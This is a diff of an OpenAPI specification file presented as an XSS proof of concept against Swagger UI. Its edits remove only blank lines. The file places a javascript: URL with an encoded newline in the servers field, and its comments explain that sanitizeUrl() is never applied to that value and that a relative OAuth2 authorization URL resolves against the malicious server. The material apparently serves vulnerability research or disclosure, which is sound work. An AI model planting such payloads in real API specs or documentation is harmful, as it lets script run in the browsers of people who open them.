@@ -2,12 +2,10 @@ openapi: "3.0.3"
 info:
   title: "XSS PoC - Swagger UI"
   version: "1.0.0"
-
 # Malicious server URL - %0a is URL-encoded newline
 # sanitizeUrl() is never called on this value
 servers:
   - url: "javascript://%0aalert(document.domain)//"
-
 paths:
   /users:
     get:
@@ -17,7 +15,6 @@ paths:
       responses:
         "200":
           description: OK
-
 # OAuth2 scheme with relative authorizationUrl
 # Relative URL gets resolved against the malicious server
 components:
